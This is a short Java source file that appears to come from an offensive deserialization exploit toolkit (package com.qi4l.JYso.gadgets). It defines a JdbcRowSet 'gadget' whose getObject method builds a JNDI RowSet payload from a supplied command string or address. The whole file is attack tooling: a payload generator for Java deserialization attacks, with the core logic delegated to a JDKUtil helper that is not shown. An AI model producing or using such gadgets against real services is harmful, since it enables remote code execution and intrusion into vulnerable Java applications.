package com.qi4l.JYso.gadgets;

public class JdbcRowSet implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        return JDKUtil.makeJNDIRowSet(command);
    }


}
